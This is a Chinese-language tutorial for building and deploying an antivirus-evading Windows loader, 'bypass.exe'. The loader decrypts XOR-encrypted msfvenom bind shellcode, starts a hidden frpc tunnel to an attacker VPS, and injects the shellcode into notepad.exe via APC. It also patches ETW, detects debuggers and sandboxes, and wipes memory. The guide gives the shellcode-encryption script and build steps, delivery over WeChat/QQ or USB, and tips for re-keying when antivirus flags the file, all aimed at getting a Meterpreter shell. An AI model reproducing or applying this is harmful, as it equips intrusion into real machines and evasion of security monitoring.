# 完整部署教程 — 从零到拿到 Shell

---

## 你需要准备的东西

| 资源 | 用途 |
|------|------|
| 一台 **公网 VPS** (Linux) | 运行 frps，做流量中转 |
| **Kali Linux** (你已有) | 生成 shellcode + 监听 |
| **Windows 电脑** (你当前电脑) | 编译 bypass.exe |
| **Visual Studio Build Tools 2022** | 编译 C 代码 |
| **目标 Windows 电脑** (自己测试用) | 运行 bypass.exe |

## 第一步：VPS 部署 frps

登录你的 VPS，执行：

```bash
# 把 frps_setup.sh 传到 VPS 或直接在线执行
wget -qO- https://.../frps_setup.sh | bash

# 或者手动复制内容执行
```

这个脚本会：
- 下载 frp 并安装 frps
- 创建 systemd 服务 (开机自启)
- 监听端口 7000 (控制) 和 4444 (shell 流量)

完成后检查：
```bash
systemctl status frps
# 应该显示 active (running)
```

防火墙放行：
```bash
ufw allow 7000; ufw allow 4444; ufw reload
```

**记下你的 VPS IP**，后面到处都要用。

## 第二步：Kali 生成 bind shellcode

在 Kali 上执行：

```bash
# 把 tools/kali_gen_shellcode.sh 传到 Kali
# 或直接用 msfvenom

msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f raw -o shellcode.bin

# 然后手动 XOR 加密
python3 -c "
data = open('shellcode.bin', 'rb').read()
key = 0xCE
enc = bytearray()
for i, b in enumerate(data):
    x = b ^ key
    x ^= (i * 0x13 + 0x57) & 0xFF
    enc.append(x)
print('const BYTE g_shellcode_enc[] = {')
for i in range(0, len(enc), 12):
    chunk = enc[i:i+12]
    print('    ' + ', '.join(f'0x{b:02X}' for b in chunk) + ',')
print('};')
print(f'SIZE_T g_shellcode_enc_len = {len(enc)};')
" > shellcode_data.h
```

或者直接用 tools/kali_gen_shellcode.sh：
```bash
chmod +x kali_gen_shellcode.sh
./kali_gen_shellcode.sh 4444
```

把生成的 **shellcode_data.h** 传到你的 Windows 电脑。

## 第三步：Windows 上编译 bypass.exe

### 3.1 确认已有文件

```
`%FRPC_PATH%\frpc_upx.exe` ← frpc 客户端 (5MB, UPX 压缩后)
```

如果没有，重新下载：
```powershell
# 下载 frp（用 %FRPC_DIR% 替换为你自己的目录）
$env:FRPC_DIR = "C:\tools\frp"
curl -L https://github.com/fatedier/frp/releases/download/v0.61.0/frp_0.61.0_windows_amd64.zip -o "$env:FRPC_DIR\frp.zip"
Expand-Archive "$env:FRPC_DIR\frp.zip" "$env:FRPC_DIR\tmp" -Force
# UPX 压缩
& "C:\tools\upx\upx-5.0.0-win64\upx.exe" --best "$env:FRPC_DIR\tmp\frpc.exe" -o "$env:FRPC_DIR\frpc_upx.exe"
```

### 3.2 生成 frpc 配置

```powershell
cd <project_root>\bypass_av
python tools\gen_frpc_config.py <你的VPS_IP> 4444 4444
```

这会在当前目录生成 `frpc.toml`，内容类似：
```toml
serverAddr = "123.45.67.89"
serverPort = 7000
[[proxies]]
name = "shell_tunnel"
type = "tcp"
localIP = "127.0.0.1"
localPort = 4444
remotePort = 4444
```

### 3.3 把 shellcode_data.h 放入项目

把 Kali 生成的 `shellcode_data.h` 复制到：
```
`<project_root>\bypass_av\shellcode_data.h`
```

### 3.4 加密并嵌入

```powershell
python tools\embed_frp.py ^
    %FRPC_PATH% ^
    frpc.toml ^
    shellcode_data.h ^
    0xCE
```

这会生成三个 .h 文件：
- `frpc_data.h` (frpc.exe 加密)
- `config_data.h` (配置文件加密)
- `shellcode_data.h` (shellcode 加密，覆盖旧文件)

### 3.5 编译

打开 **Visual Studio 2022 x64 命令行**，然后：

```powershell
cd <project_root>\bypass_av
build_bypass.bat    :: 老脚本，thin shell
:: 或
build.bat plain    :: 推荐的统一入口
```

如果一切顺利，输出：
```
[*] Done! Output: bypass.exe
```

**编译失败排查：**

| 错误 | 解决办法 |
|------|---------|
| `frpc_data.h not found` | 先运行 embed_frp.py |
| `cl.exe 不是内部命令` | 用 VS x64 命令行，不是普通 cmd |
| `LNK无效的入口点` | `/ENTRY:main` 要写在编译命令里 |
| `LNK2005 _main 已定义` | main.c 没有 main 函数 |

## 第四步：把 bypass.exe 发到目标

目标机器是 **你自己测试用的 Windows 电脑**。

传输方式：
- 微信/QQ 发送
- U盘拷贝
- 网盘下载
- 同局域网 SMB 共享

**注意**：Windows Defender 可能会拦截，但 bypass.exe 的静态特征应该能过。如果被拦，把你的项目文件夹加入 Defender 排除项。
```
设置 → 更新和安全 → Windows 安全中心 → 病毒和威胁防护
→ 管理设置 → 排除项 → 添加排除项 → 文件夹
选择 <你的项目根目录>
```

## 第六步：跑起来

在目标 Windows 电脑上双击运行 `bypass.exe`。

**发生什么了？（v3 幕后流程）**

```
目标电脑:
  bypass.exe 运行
    ├─ 反调试 ①: PEB.BeingDebugged / NtGlobalFlag
    ├─ 反调试 ②: 硬件断点 (DR0-DR3)
    ├─ 反调试 ③: NtQueryInformationProcess (DebugPort)
    ├─ 修补 ETW: NtTraceEvent + EtwEventWrite → ret (防日志)
    ├─ 延迟 3 秒 + 再次反调试
    ├─ 沙箱检测: 鼠标是否动过? 最后输入时间? 开机<5分钟?
    ├─ 延迟 5 秒 (绕过多步行为分析)
    │
    ├─ 解密 frpc.exe → %TEMP%\frpc.exe
    ├─ 解密 frpc.toml → %TEMP%\frpc.toml
    ├─ 启动 frpc.exe (隐藏窗口, CREATE_NO_WINDOW)
    │    └─ 连上 VPS:7000，建立隧道
    │    └─ 隧道规则: VPS:4444 → 目标 localhost:4444
    ├─ 等待 4 秒让隧道就绪
    │
    ├─ 解密 bind shellcode (内存中瞬间解密)
    ├─ 创建挂起的 notepad.exe
    ├─ VirtualAllocEx 分配内存
    ├─ WriteProcessMemory 写入 shellcode
    ├─ 内存清零: memset(明文shellcode, 0, len) ← 防内存dump
    ├─ VirtualProtectEx → PAGE_EXECUTE_READ
    ├─ APC 注入: QueueUserAPC(remote, hThread, 0)
    ├─ ResumeThread → 线程启动
    │   └─ LdrInitializeThunk → NtTestAlert → APC 触发
    │   └─ shellcode 开始执行 (在 notepad.exe 内)
    └─ shellcode 开始监听 localhost:4444
    
    注: 整个过程不使用 CreateRemoteThread / NtCreateThreadEx
    → 这两个 API 被几乎所有杀软监控

VPS:
  frps 收到 frpc 连接
  frps 收到 Kali 对 VPS:4444 的连接
  frps 通过隧道转发给目标的 frpc
  frpc 转发给目标的 localhost:4444

Kali:
  msfconsole 连接 VPS:4444
  → 经过 frps 隧道
  → 到达目标的 bind shell
  → 获得 cmd.exe 控制台
  meterpreter > ← 你在这里
```

## 免杀技术速查 (v3)

| 检测手段 | bypass.exe 如何应对 |
|----------|-------------------|
| 静态扫描 (.rdata 字符串) | 所有字符串 XOR 加密，零明文 |
| 导入表扫描 (IAT) | 仅 kernel32/user32/advapi32 正常导入，ntdll 函数通过 PEB 动态解析 |
| API Hook (CreateRemoteThread) | 使用 APC 注入，完全不调用 CreateRemoteThread |
| API Hook (NtCreateThreadEx) | 不使用 NtCreateThreadEx |
| ETW 日志 | 修补 NtTraceEvent + EtwEventWrite |
| 沙箱 (自动分析) | 检测鼠标/输入/运行时间，无交互则不执行 |
| 调试器 | PEB标志 + 硬件断点 + DebugPort 三重检测 |
| 内存 dump | shellcode 写入后立即清零本进程内存 |
| 行为分析 (时序) | 多步延迟 + 拆分行为链 |
| 网络检测 (出站) | 通过 FRP 隧道复用单一连接 |

## 常见问题

**Q: VPS 没有 frps_setup.sh？**
A: 直接手动安装：下载 frp → 解压 → 运行 `./frps -c frps.toml`

**Q: shellcode_data.h 在哪生成？**
A: 在 Kali 上运行 kali_gen_shellcode.sh，然后把文件传到 Windows 项目目录

**Q: 编译时说找不到 frpc_data.h？**
A: 忘了运行 embed_frp.py，先加密再编译

**Q: 目标运行后没连回来？**
A: 检查：
- frps 运行了吗？ `systemctl status frps`
- 防火墙开了吗？ `ufw status`
- VPS IP 填对了吗？ 检查 frpc.toml
- 目标能联网吗？ `ping <VPS_IP>`

**Q: 火绒报毒了？**
A: 换 XOR KEY (把 0xCE 改成别的值，重新跑所有步骤)，或者加 UPX 壳再压缩一层。

**Q: 什么是 APC 注入？和 CreateRemoteThread 有什么区别？**
A: APC 注入利用线程初始化时的 NtTestAlert 机制触发 shellcode，不需要创建新线程。CreateRemoteThread 被所有杀软重点监控，APC 注入的监控面小得多。
